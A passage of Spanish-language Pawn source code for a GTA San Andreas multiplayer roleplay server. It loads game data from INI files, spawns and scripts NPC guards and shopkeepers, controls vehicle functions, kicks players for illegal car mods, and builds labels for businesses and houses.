	INI_WriteInt(Arch,"Tamaño",Objeto[i][oTamano]);
	INI_WriteInt(Arch,"Color",Objeto[i][oColor]);
	INI_WriteInt(Arch,"Tamaño_o",Objeto[i][oTamanoO]);
	INI_WriteInt(Arch,"Index_o",Objeto[i][oIndexO]);

	INI_WriteFloat(Arch,"Pos_x",Objeto[i][oPosx]);
	INI_WriteFloat(Arch,"Pos_y",Objeto[i][oPosy]);
	INI_WriteFloat(Arch,"Pos_z",Objeto[i][oPosz]);
	INI_WriteFloat(Arch,"Ang_x",Objeto[i][oAngx]);
	INI_WriteFloat(Arch,"Ang_y",Objeto[i][oAngy]);
	INI_WriteFloat(Arch,"Ang_z",Objeto[i][oAngz]);

	INI_WriteString(Arch,"Nombre",Objeto[i][oNombre]);

	INI_Close(Arch);
	return 1;
}

stock CargarTelevisores()
{
	if(!fexist("Televisores.ini")) return 1;
	new
		File:F_TV = fopen("Televisores.ini", io_read),
		Data[30],
		i = -1;

	while(fread(F_TV, Data))
	{
		i++;
	    unformat(Data,"p<|>fff", InfoTV[i][tvPos][0], InfoTV[i][tvPos][1], InfoTV[i][tvPos][2]);
		CreateDynamicPickup(ID_PICKUPTV, 1, InfoTV[i][tvPos][0], InfoTV[i][tvPos][1], InfoTV[i][tvPos][2]);
		CreateDynamic3DTextLabel("Televisor\n\n"#CINFO"(/usar televisor)", C_BLANCO, InfoTV[i][tvPos][0], InfoTV[i][tvPos][1], InfoTV[i][tvPos][2], 10.0);
	}
	print("*- Sistema de televisores cargado.");
	return 1;
}

stock CargarContratos()
{
	if(!fexist("Facciones/Hitman/Contratos.ini"))
	    return 0;

	new
		File:ContratHit = fopen("Facciones/Hitman/Contratos.ini", io_read),
		Str[60],
		i = -1;

	while(fread(ContratHit, Str))
	{
		i++;
		unformat(Str,"p<|>s[24]ds[24]", InfoContrato[i][hitPor], InfoContrato[i][hitDinero],  InfoContrato[i][hitVictima]);
		strdel(InfoContrato[i][hitVictima],strlen(InfoContrato[i][hitVictima])-2, InfoContrato[i][hitVictima]);
	}

  	printf("*- Sistema de contratos para hitman cargado (%d)", i+1);
	return 1;
}

stock CrearMinerales()
{
	for(new i; i < sizeof(PosMinerales); i += 1+random(3) )
	{
	    new
	        rand = random(51),
			min_type;

		switch(rand)
		{
		    //Hierro y carbón (Más abundantes)
		    case 0..20:
				min_type = MIN_HIERRO;
			case 21..40:
			    min_type = MIN_CARBON;

			//Oro y Plata
			case 41..43:
			    min_type = MIN_PLATA;
			case 44,45:
			    min_type = MIN_ORO;

			//Diamante
			case 46:
			    min_type = MIN_DIAMANTE;

			//Corindón
			case 47:
			    min_type = MIN_ZAFIRO;
			case 48:
			    min_type = MIN_RUBI;
			case 49,50:
			    min_type = MIN_ESMERALDA;
		}
		InfoMineral[i][minType] = min_type;
		InfoMineral[i][minObjID] = CreateDynamicObject(3931, PosMinerales[i][0], PosMinerales[i][1], PosMinerales[i][2], PosMinerales[i][3], PosMinerales[i][4], PosMinerales[i][5]);
		SetDynamicObjectMaterial(InfoMineral[i][minObjID], 0, 3931, "none", "none", min_type);
		Bit_Set(ValidMineral, i, true);
	}
	printf("*- Los minerales fueron creados.");
	return 1;
}

stock ActualizarContratos()
{
	new
		File:ContratHit = fopen("Facciones/Hitman/Contratos.ini", io_write),
		Str[60];

	Loop(i, sizeof InfoContrato, 0)
	{
	    if(strlen(InfoContrato[i][hitPor]) && InfoContrato[i][hitDinero])
	    {
			A_Format(Str,"%s|%d|%s\r\n", InfoContrato[i][hitPor], InfoContrato[i][hitDinero], InfoContrato[i][hitVictima]);
			fwrite(ContratHit, Str);
		}
	}

	fclose(ContratHit);

	return 1;
}

stock CargarGangZones()
{
	if(!fexist("GangZones.ini")) return 1;

	new
		File:F_GZ = fopen("GangZones.ini", io_read),
 		Data[70];

    while( fread(F_GZ, Data) )
    {
        static i;

        i++;

	    unformat(Data,"p<|>ffffi",
		InfoGZ[i][gzMin][0],
		InfoGZ[i][gzMin][1],
		InfoGZ[i][gzMax][0],
		InfoGZ[i][gzMax][1],
		InfoGZ[i][gzPandilla]);

		if(InfoGZ[i][gzMin][0] && InfoGZ[i][gzMin][1])
		{
			CrearGangZone(i,InfoGZ[i][gzMin][0],InfoGZ[i][gzMin][1],InfoGZ[i][gzMax][0],InfoGZ[i][gzMax][1], InfoGZ[i][gzPandilla]);
		}
		ClearString(Data);
	}
	print("*- Sistema de gangzones cargado.");
	return 1;
}

stock CargarModelos()
{
	#if defined VERSION_03x

    m_Skins_m = LoadModelSelectionMenu("Modelos/Skins_m.dll");
    m_Skins_f = LoadModelSelectionMenu("Modelos/Skins_f.dll");
    m_Accesorios = LoadModelSelectionMenu("Modelos/Accesorios.dll");
    m_Muebles = LoadModelSelectionMenu("Modelos/Muebles.dll");

	print("*- Sistema de modelos cargado. (0.3x)");

    #endif

    return 1;

}

#if defined USE_FCNPC

stock FCNPC_SpawnFixSkin(npcid, skin, Float:x, Float:y, Float:z)
{
	if(npcid > MAX_PLAYERS-1 || !npcid)
	    return 0;

	FCNPC_Skin[npcid] = skin;
	return FCNPC_Spawn(npcid, skin, x, y, z);
}

#define FCNPC_Spawn FCNPC_SpawnFixSkin

#endif

CALLBACK: CargarNPCS()
{
	print("*- El sistema de NPC fue cargado, conectando Bots..");

	#if defined USE_FCNPC

    new Point = 0;

	// -======> Francisco (Guardia LSPD)
	NPC_GUARDIA_LSPD = FCNPC_Create("Francisco");

	FCNPC_Spawn(NPC_GUARDIA_LSPD, 280, POS_NPC_GUARDIA_LSPD[Point][0], POS_NPC_GUARDIA_LSPD[Point][1], POS_NPC_GUARDIA_LSPD[Point][2]);

	// -======> Camilo (Guardia LSMD)
	NPC_GUARDIA_LSMD = FCNPC_Create("Sebastian");

	FCNPC_Spawn(NPC_GUARDIA_LSMD, 280, POS_NPC_GUARDIA_LSMD[Point][0], POS_NPC_GUARDIA_LSMD[Point][1], POS_NPC_GUARDIA_LSMD[Point][2]);

	// -======> Bots de negocios
	new
	    BOT_NAME[24];

	foreach(Negocios, i)
	{
		A_Format(BOT_NAME, "Vendedor%d", i);
		switch(InfoNegocio[i][nTipo])
		{
		    case N_247:
		    {
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				FCNPC_Spawn(NPC_NEGOCIO[i], 172, -28.6548,-186.9577,1003.5469);
			}
		    case N_ROPA:
		    {
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				if(InfoNegocio[i][nSalida_x] == 207.054992) // ProLaps
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 181, 206.8753,-127.4043,1003.5078);
				}
				else if(InfoNegocio[i][nSalida_x] == 204.332992) // Didler
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 192, 204.1369,-157.3388,1000.5234);
				}
				else if(InfoNegocio[i][nSalida_x] == 226.293991) // Victim
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 3, 204.6883,-8.1715,1001.2109);
				}
				else if(InfoNegocio[i][nSalida_x] == 207.737991) // Binco
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 56, 208.7430,-98.3606,1005.2578);
				}
			}
		    case N_COMIDA:
		    {
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				if(InfoNegocio[i][nSalida_x] == 363.908813) // BurguerShot
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 205, 376.4635,-65.4233,1001.5078);
				}
				else if(InfoNegocio[i][nSalida_x] == 372.277893) // Pizzeria
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 155, 373.1565,-116.3283,1001.4995);
				}
				else if(InfoNegocio[i][nSalida_x] == 364.875610) // Polleria
				{
					FCNPC_Spawn(NPC_NEGOCIO[i], 167, 368.2161,-4.2193,1001.8516);
				}
			}
			case N_ARMAS:
			{
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				FCNPC_Spawn(NPC_NEGOCIO[i], 179, 316.5101,-133.1617,999.6016);
			}
			case N_TECNOLOGIA:
			{
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				FCNPC_Spawn(NPC_NEGOCIO[i], 289, -1707.3932,1887.2108,1068.7859);
			}
			case N_FARMACIA:
			{
				NPC_NEGOCIO[i] = FCNPC_Create(BOT_NAME);
				FCNPC_Spawn(NPC_NEGOCIO[i], 70, 171.2250,-72.1033,963.2859);
			}
			default: continue;
		}
		SetPlayerVirtualWorld(NPC_NEGOCIO[i], i+1000);
	}
	// -======> Claudia(Secretaria LSPD)
	NPC_SECRETARIA_LSPD = FCNPC_Create("Claudia");

	FCNPC_Spawn(NPC_SECRETARIA_LSPD, 150, 225.66, 110.78, 1003.22);

	#else
	ConnectNPC("Claudia", "NPC_SecretariaLSPD");
	#endif

	printf("==============================================");
	printf("*- Todos los npc fueron creados.");
	printf("==============================================");
	return 1;
}

#if defined USE_FCNPC

public FCNPC_OnFinishPlayback(npcid)
{
	if(npcid == NPC_SECRETARIA_LSPD)
	{
		FCNPC_StartRecordingPlayback(npcid, "Asistente_LSPD");
	}
	return 1;
}

public FCNPC_OnRespawn(npcid)
{
	foreach(Negocios, i)
	{
	    if(npcid == NPC_NEGOCIO[i])
	    {
			SetPlayerVirtualWorld(NPC_NEGOCIO[i], i+1000);
		}
	}
	FCNPC_SetSkin(npcid, FCNPC_Skin[npcid]);
	return 1;
}

public FCNPC_OnSpawn(npcid)
{
	FCNPC_AimID[npcid] = INVALID_PLAYER_ID;
	FCNPC_TargetID[npcid] = INVALID_PLAYER_ID;

	if(npcid == NPC_GUARDIA_LSPD)
	{
	    POINT_GUARDIA_LSPD = 1;
	    FCNPC_SetWeapon(npcid, 31);
	    FCNPC_SetAmmo(npcid, 30);
		FCNPC_SetArmour(npcid, 80);
		FCNPC_GoTo(npcid, POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][0], POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][1], POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][2], MOVE_TYPE_WALK, 3.0, 0);
		Iter_Add(FCNPCs, NPC_GUARDIA_LSPD);
		return 1;
	}
	if(npcid == NPC_GUARDIA_LSMD)
	{
	    POINT_GUARDIA_LSMD = 1;
	    FCNPC_SetWeapon(npcid, 31);
	    FCNPC_SetAmmo(npcid, 30);
		FCNPC_SetArmour(npcid, 80);
		FCNPC_GoTo(npcid, POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][0], POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][1], POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][2], MOVE_TYPE_WALK, 3.0, 0);
		Iter_Add(FCNPCs, NPC_GUARDIA_LSMD);
		return 1;
	}
	new
	    Float: Angle;
	foreach(Negocios, i)
	{
	    if(npcid == NPC_NEGOCIO[i])
	    {
	        switch(FCNPC_GetSkin(npcid))
	        {
	            case 172, 192, 56, 205:
	            {
	                new Skin = FCNPC_GetSkin(npcid);
	                switch(Skin)
	                {
						case 205, 192, 56: Angle = 180.0;
						default: Angle = 0.0;
					}
					FCNPC_SetAngle(npcid, Angle);
					continue;
				}
	            case 70, 181, 3, 155, 167, 179, 289:
	            {
	                new Skin = FCNPC_GetSkin(npcid);
	                switch(Skin)
	                {
						case 3, 289: Angle = -90.0;
						case 179: Angle = 90.0;
						case 181, 155, 167: Angle = 180.0;
						default: Angle = 0.0;
					}
					FCNPC_SetAngle(npcid, Angle);
					continue;
				}
			}
		}
	}
	if(npcid == NPC_SECRETARIA_LSPD)
	{
		new Text3D:NombreBOT = Create3DTextLabel("Claudia",C_BLANCO,0,0,0,10.0,1);
		Attach3DTextLabelToPlayer(NombreBOT,npcid,0,0,0.2);
		FCNPC_StartRecordingPlayback(npcid, "Asistente_LSPD");
		SetPlayerAttachedObject(npcid, 0, 2356, 7, -0.0600, -0.6340, 0.0459, -88.8999, -7.2999, -104.5000, 1.0000, 1.0000, 1.0000);
	}
	return 1;
}

#endif

stock RandFemaleName()
{
	new
		N[20];

	switch(random(16))
	{
	    case 0: N = "Maria";
	    case 1: N = "Fernanda";
	    case 2: N = "Amelia";
	    case 3: N = "Camila";
	    case 4: N = "Agustina";
	    case 5: N = "Lara";
	    case 6: N = "Candela";
	    case 7: N = "Victoria";
	    case 8: N = "Brenda";
	    case 9: N = "Adriana";
	    case 10: N = "Beatriz";
	    case 11: N = "Daniela";
	    case 12: N = "Evangelina";
	    case 13: N = "Graciela";
	    case 14: N = "Ivana";
	}
	return N;
}

stock RandMaleName()
{
	new
		N[20];

	switch(random(16))
	{
	    case 0: N = "Facundo";
	    case 1: N = "Rodrigo";
	    case 2: N = "Agustin";
	    case 3: N = "Edgar";
	    case 4: N = "Alejandro";
	    case 5: N = "Adrian";
	    case 6: N = "Andres";
	    case 7: N = "Jonathan";
	    case 8: N = "Arturo";
	    case 9: N = "Octavio";
	    case 10: N = "Gonzalo";
	    case 11: N = "Alexis";
	    case 12: N = "Alex";
	    case 13: N = "Fernando";
	    case 14: N = "Ivan";
	}
	return N;
}

#if defined USE_FCNPC

public FCNPC_OnDeath(npcid, killerid, weaponid)
{
	SetTimerEx("RevivirNPC", 25000, false, "i", npcid);
	if(npcid == NPC_GUARDIA_LSPD)
	{
	    if(killerid != INVALID_PLAYER_ID)
	    {
	        MensajeFaccion(IDLSPD, ""#CVERDE"[TORRE DE CONTROL] "#CBLANCO"¡Un delincuente asesinó al guardia de la policía al frente de LSPD!");
		}
	    return 1;
	}
	if(npcid == NPC_GUARDIA_LSMD)
	{
	    if(killerid != INVALID_PLAYER_ID)
	    {
	        MensajeFaccion(IDLSPD, ""#CVERDE"[TORRE DE CONTROL] "#CBLANCO"¡Un delincuente asesinó un guardia en frente del hospital!");
		}
	    return 1;
	}
	return 1;
}

CALLBACK: RevivirNPC(npcid)
{
	FCNPC_Respawn(npcid);
	return 1;
}

timer UpdateFCNPC[250]()
{
	foreach(FCNPCs, i)
	{
 		if(FCNPC_AimID[i] != INVALID_PLAYER_ID)
	    {
	        if(!IsPlayerConnected(FCNPC_AimID[i]))
			{
				FCNPC_AimID[i] = INVALID_PLAYER_ID;
				continue;
			}
	        new Float: x, Float: y, Float: z;
	        GetPlayerPos(FCNPC_AimID[i], x, y, z);
	        FCNPC_AimAt(i, x, y, z, 0);
 		}
	    else if(FCNPC_TargetID[i] != INVALID_PLAYER_ID)
	    {
	        if(!IsPlayerConnected(FCNPC_TargetID[i]))
			{
				FCNPC_TargetID[i] = INVALID_PLAYER_ID;
				continue;
			}
	        new Float: x, Float: y, Float: z;
	        GetPlayerPos(FCNPC_TargetID[i], x, y, z);
	        FCNPC_AimAt(i, x, y, z, 1);
 		}
	}
	return 1;
}

CALLBACK: SacarBroncaDeGuardia(playerid, npcid)
{
	DeletePVar(playerid, "ATACADO_POR_GUARDIA");
	if(FCNPC_AimID[npcid] == playerid)
	{
	    FCNPC_AimID[npcid] = INVALID_PLAYER_ID;
    	FCNPC_OnReachDestination(npcid);
	}
	if(FCNPC_TargetID[npcid] == playerid)
	{
	    FCNPC_TargetID[npcid] = INVALID_PLAYER_ID;
    	FCNPC_OnReachDestination(npcid);
	}
	return 1;
}

public FCNPC_OnTakeDamage(npcid, damagerid, weaponid, bodypart, Float:health_loss)
{
	if(npcid == NPC_GUARDIA_LSPD || npcid == NPC_GUARDIA_LSMD)
	{
	    new
			Bronca = GetPVarInt(damagerid, "ATACADO_POR_GUARDIA");

		if(Bronca == 0)
		{
			FCNPC_Stop(npcid);
  			FCNPC_AimID[npcid] = damagerid;
			SetPVarInt(damagerid, "ATACADO_POR_GUARDIA", 1);
			SetPlayerChatBubble(npcid, "Alto ahi! Tengo autorización para disparar", C_INFO, 25.0, 3000);
		}
		else if(Bronca == 1)
		{
			SetPVarInt(damagerid, "ATACADO_POR_GUARDIA", 2);
			FCNPC_AimID[npcid] = INVALID_PLAYER_ID;
   			FCNPC_TargetID[npcid] = damagerid;
			SetPlayerChatBubble(npcid, "Se lo adverti!", C_INFO, 25.0, 3000);
   			SetTimerEx("SacarBroncaDeGuardia", 30000, false, "ii", damagerid, npcid);
		}

		return 1;
	}
	foreach(Negocios, i)
	{
		if(npcid == NPC_NEGOCIO[i])
		{
		    if(!weaponid) return 0;
			cmd_crack(npcid, "");
			SetTimerEx("cmd_detener", 30000, false, "i", npcid);
		}
	}
	return 1;
}

public FCNPC_OnCreate(npcid)
{
	return 1;
}

public FCNPC_OnReachDestination(npcid)
{
	if(npcid == NPC_GUARDIA_LSPD)
	{
		if(FCNPC_TargetID[npcid] != INVALID_PLAYER_ID || FCNPC_AimID[npcid] != INVALID_PLAYER_ID ) return 1;

		if(POINT_GUARDIA_LSPD >= sizeof(POS_NPC_GUARDIA_LSPD))
		{
		    POINT_GUARDIA_LSPD = 0;
		}
		FCNPC_GoTo(npcid, POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][0], POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][1], POS_NPC_GUARDIA_LSPD[POINT_GUARDIA_LSPD][2], MOVE_TYPE_WALK, 3.0, 0);
		POINT_GUARDIA_LSPD++;
		return 1;
	}
	if(npcid == NPC_GUARDIA_LSMD)
	{
		if(FCNPC_TargetID[npcid] != INVALID_PLAYER_ID || FCNPC_AimID[npcid] != INVALID_PLAYER_ID ) return 1;

		if(POINT_GUARDIA_LSMD >= sizeof(POS_NPC_GUARDIA_LSMD))
		{
		    POINT_GUARDIA_LSMD = 0;
		}
		FCNPC_GoTo(npcid, POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][0], POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][1], POS_NPC_GUARDIA_LSMD[POINT_GUARDIA_LSMD][2], MOVE_TYPE_WALK, 3.0, 0);
		POINT_GUARDIA_LSMD++;
		return 1;
	}
	return 1;
}

#endif

stock LetraRandom()
{
	new Letras[] =
	{
	    'A','B','C','D','E','F','G','H','I',
		'J','K','L','M','N','O','P','Q','R',
		'S','T','U','V','W','X','Y','Z'
	};

	return Letras [ random(sizeof Letras) ];
}

public OnVehicleMod(playerid, vehicleid, componentid)
{
    new vehicleide = GetVehicleModel(vehicleid);
    new modok = islegalcarmod(vehicleide, componentid);

	if(playerid != INVALID_PLAYER_ID)
	{
		if((IsPlayerInRangeOfPoint(playerid,2,617.5303,-1.9900,1000.651) && GetPlayerInterior(playerid) == 1) ||
		(IsPlayerInRangeOfPoint(playerid,2,616.7830,-74.8150,997.772) && GetPlayerInterior(playerid) == 2) ||
		(IsPlayerInRangeOfPoint(playerid,2,615.2862,-124.2390,997.697) && GetPlayerInterior(playerid) == 3))
		{}
		else
		{
			SetTimerEx("T_RemoveVehicleComponent",500,false,"ii",vehicleid, componentid);
			return antic_Kick(playerid,"Vehicle tunning"), Kick(playerid);
		}
	}
    if (!modok)
	{
		SetTimerEx("T_RemoveVehicleComponent",500,false,"ii",vehicleid, componentid);
		if(playerid != INVALID_PLAYER_ID)
			antic_Ban(playerid,"Componente inválido");
		return 0;
    }

	if(VehVenta_ID(vehicleid))
	{
		vMods[VehVenta_ID(vehicleid)][GetVehicleComponentType(componentid)] = componentid;
	 	ActualizarVehiculo(VehVenta_ID(vehicleid));
	}
	return 1;
}

CALLBACK: T_RemoveVehicleComponent(vehicleid, componentid) return RemoveVehicleComponent(vehicleid, componentid);

stock BorrarObjetoTirado(id)
{
	DestroyDynamicObject(OBJ_T[id]);
	DestroyDynamic3DTextLabel(Label_OBJ_T[id]);

	InfoObjeto_T[id][TipoOBJ] = 0;
	InfoObjeto_T[id][IntOBJ] = 0;
	InfoObjeto_T[id][VWOBJ] = 0;
	InfoObjeto_T[id][ArmaOBJ] = 0;
	InfoObjeto_T[id][BalasOBJ] = 0;
	InfoObjeto_T[id][Posx] = 0.0;
	InfoObjeto_T[id][Posy] = 0.0;
	InfoObjeto_T[id][Posz] = 0.0;
	InfoObjeto_T[id][ArmaduraOBJ] = 0.0;
	InfoObjeto_T[id][TickOBJ] = 0;
	return 1;
}

stock AutoPermitido(vehicleid)
{
	if(vehicleid < 400 || vehicleid > 611) return false;
	else return true;
}

stock SlotObjeto_T()
{
	Loop(i,MAX_OBJETOS_T,0)
	{
	    if(InfoObjeto_T[i][TipoOBJ] == 0 && !InfoObjeto_T[i][Posx]) return i;
	}
	return -1;
}

stock AutoRol(playerid, rol[])
{
	new string[160];
	format(string, sizeof(string), "  * %s %s *",NombreJugador(playerid), rol);
	ProxDetector(20.0, playerid, string,C_ME,C_ME,C_ME,C_ME,C_ME);
	return 1;
}

CALLBACK: EncontrarJugador(playerid, quien)
{
    if(quien == INVALID_PLAYER_ID || !IsPlayerConnected(quien) ) return GameTextForPlayer(playerid, "~r~error", 5000, 3);
	SetPlayerMarkerForPlayer(playerid, quien, 0xFF0000FF);
	GameTextForPlayer(playerid, "~g~~h~encontrado", 5000, 3);
	SetTimerEx("DesmarcarPos", 1000*5, false, "iii", playerid, 0, quien);
	return 1;
}

CALLBACK: DescagarCamionB(playerid)
{
	Mensaje(playerid,-1,"Ya descargaste la basúra, ahora regresa para devolver el camión (y recibir el dinero)");
	SetPlayerCP(playerid,CP_BASURERO,1279.0297,-1248.3020,14.010,8);
	SetPVarInt(playerid,"TerminoBasura",1);
	SetProgressBarValue(BCosecha[playerid],0);
	UpdateProgressBar(BCosecha[playerid], playerid);
	return 1;
}

CALLBACK: SubeBarraMotor(playerid)
{
	if(GetProgressBarValue(BMotor[playerid]) < 100.0)
	{
		SetProgressBarValue(BMotor[playerid],GetProgressBarValue(BMotor[playerid])+5.0);
		UpdateProgressBar(BMotor[playerid], playerid);
		return 1;
	}
	else
	{
	    KillTimer2(playerid,TIMER_BMOTOR);
		SetProgressBarValue(BMotor[playerid],0.0);
		HideProgressBarForPlayer(playerid, BMotor[playerid]);
		new
			veh = GetPlayerVehicleID(playerid);

	    new
			rand = random(8);
			
     	if(VGas[veh] > 1.0)
      	{
		    switch (rand)
		    {
		        case 0,1,2,3,4:
		        {
		            AutoRol(playerid,"enciende el motor del vehículo");
		            EncenderMotor(veh);
				}
				default:
				{
		            AutoRol(playerid,"no logra encender el motor");
				}
			}
		}
		else
		{
		    switch (rand)
		    {
		        case 0:
		        {
		            AutoRol(playerid,"enciende el motor del vehículo");
		            EncenderMotor(veh);
				}
				default:
				{
		            AutoRol(playerid,"no logra encender el motor");
				}
			}
		}
	}
	return 1;
}

#define engine 		engine_
#define lights 		lights_
#define alarm 		alarm_
#define doors 		doors_
#define bonnet 		bonnet_
#define boot 		boot_
#define objective 	objective_

stock EncenderMotor(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,VEHICLE_PARAMS_ON,lights,alarm,doors,bonnet,boot,objective);
	Veh[vehid][vMotor] = true;
}
stock ApagarMotor(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
	Veh[vehid][vMotor] = false;
}
stock EncenderLuces(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,VEHICLE_PARAMS_ON,alarm,doors,bonnet,boot,objective);
	Veh[vehid][vLuces] = true;
}
stock ApagarLuces(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,VEHICLE_PARAMS_OFF,alarm,doors,bonnet,boot,objective);
	Veh[vehid][vLuces] = false;
}
stock EncenderAlarma(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,VEHICLE_PARAMS_ON,doors,bonnet,boot,objective);
	Veh[vehid][vAlarma] = true;
}
stock ApagarAlarma(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,VEHICLE_PARAMS_OFF,doors,bonnet,boot,objective);
	Veh[vehid][vAlarma] = false;
}
stock AbrirPuertas(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,VEHICLE_PARAMS_OFF,bonnet,boot,objective);
	Veh[vehid][vCerrado] = false;
}
CALLBACK: CerrarPuertas(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,VEHICLE_PARAMS_ON,bonnet,boot,objective);
	Veh[vehid][vCerrado] = true;
}
stock AbrirCapo(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,doors,VEHICLE_PARAMS_ON,boot,objective);
	Veh[vehid][vCapo] = true;
}
stock CerrarCapo(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,doors,VEHICLE_PARAMS_OFF,boot,objective);
	Veh[vehid][vCapo] = false;
}
stock AbrirBaul(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_ON,objective);
	Veh[vehid][vBaul] = true;
}
stock CerrarBaul(vehid)
{
	GetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(vehid,engine,lights,alarm,doors,bonnet,VEHICLE_PARAMS_OFF,objective);
	Veh[vehid][vBaul] = false;
}

#undef engine
#undef lights
#undef alarm
#undef doors
#undef bonnet
#undef boot
#undef objective

// ----========[ Facciones ]=======--------- //

stock MensajeFaccion(famid,msg[])
{
	foreach(Player,i)
	{
	    if(InfoJugador[i][jLider] == famid || InfoJugador[i][jMiembro] == famid)
		{
	    	Mensaje(i,-1,msg);
		}
	}
	return 1;
}


stock ActualizarNegLabel(n, bool: Crear = false)
{
	static
	    count_direction[sizeof ZoneNames],
		Neg_ID_Direccion[MAX_NEGOCIOS];

	new
		LabelStr[300],
		name_zone[28],
		str_direction[28+8],
		id_zone;

	id_zone = GetZoneNameAtCoord(InfoNegocio[n][nEntrada_x], InfoNegocio[n][nEntrada_y], name_zone);

	Loop(i, sizeof (ZoneNames), 0)
	{
	    if(id_zone == i) continue;

	    new
			str[28];
	    strunpack(str, ZoneNames[i][zoneName]);
	    if(!strcmp(str, name_zone))
	    {
	    	id_zone = i;
	    	break;
		}
	}

	if(Crear)
	{
        count_direction[id_zone] ++;
        Neg_ID_Direccion[n] = count_direction[id_zone];
	}

	A_Format(str_direction, "%s nº %d", name_zone, Neg_ID_Direccion[n]);

	if(InfoNegocio[n][nComprado])
	{
		if(InfoNegocio[n][nPrecioEntrada])
		{
			format(LabelStr,sizeof(LabelStr),""#CROJO"%s\n\n"#CBLANCO"Pertenece a "#CVERDE"%s\n"#CBLANCO"Dirección: "#CVERDE"%s\n"#CBLANCO"Entrada: "#CVERDE"$%d",
			InfoNegocio[n][nNombre],InfoNegocio[n][nComprador], str_direction, InfoNegocio[n][nPrecioEntrada]);
		}
		else
		{
			format(LabelStr,sizeof(LabelStr),""#CROJO"%s\n\n"#CBLANCO"Pertenece a "#CVERDE"%s\n"#CBLANCO"Dirección: "#CVERDE"%s",
			InfoNegocio[n][nNombre],InfoNegocio[n][nComprador], str_direction);
		}
	}
	else
	{
		format(LabelStr,sizeof(LabelStr),""#CROJO"%s\n\n"#CBLANCO"Precio: "#CVERDE"$%d "#CBLANCO"| Usa: "#CINFO"/comprar negocio\n"#CBLANCO"Dirección: "#CVERDE"%s",
		InfoNegocio[n][nNombre],InfoNegocio[n][nPrecio], str_direction);
	}
	if(InfoNegocio[n][nCerrado])
	{
	    strins(LabelStr,"\n"#CaBLANCO"Puerta: "#CROJO"Cerrada",strlen(LabelStr));
	}
 	strins(LabelStr,MSG_TECLAENTRAR,strlen(LabelStr));
 	if(Crear)
 	{
 		Negocio[n] = CreateDynamic3DTextLabel(LabelStr,C_BLANCO,InfoNegocio[n][nEntrada_x],InfoNegocio[n][nEntrada_y],InfoNegocio[n][nEntrada_z]+1,8);
	}
	else
	{
 		UpdateDynamic3DTextLabelText(Negocio[n], C_BLANCO, LabelStr);
	}
	return 1;
}

stock ActualizarCasaLabel(c, bool: Crear = false)
{
	static
	    count_direction[sizeof ZoneNames],
		Casa_ID_Direccion[MAX_CASAS];

	new
		LabelStr[300],
		name_zone[28],
		str_direction[28+8],
		id_zone;

	id_zone = GetZoneNameAtCoord(InfoCasa[c][cEntrada_x], InfoCasa[c][cEntrada_y], name_zone);

	Loop(i, sizeof (ZoneNames), 0)
	{
	    if(id_zone == i) continue;

	    new
			str[28];
	    strunpack(str, ZoneNames[i][zoneName]);
	    if(!strcmp(str, name_zone))
	    {
	    	id_zone = i;
	    	break;
		}
	}

	if(Crear)
	{
        count_direction[id_zone] ++;
        Casa_ID_Direccion[c] = count_direction[id_zone];
	}

	A_Format(str_direction, "%s nº %d", name_zone, Casa_ID_Direccion[c]);
	alm(InfoCasa[c][cDireccion], str_direction);

	if(InfoCasa[c][cComprada])
	{
		if(InfoCasa[c][cCerrada])
		{
			format(LabelStr,sizeof(LabelStr),"Casa "#CROJO"'%s'\n\n"#CBLANCO"Pertenece a "#CVERDE"%s\n"#CBLANCO"Dirección: "#CVERDE"%s\n"#CBLANCO"Puerta: "#CROJO"Cerrada",
			InfoCasa[c][cNombre],InfoCasa[c][cComprador], str_direction);
		}
		else
		{
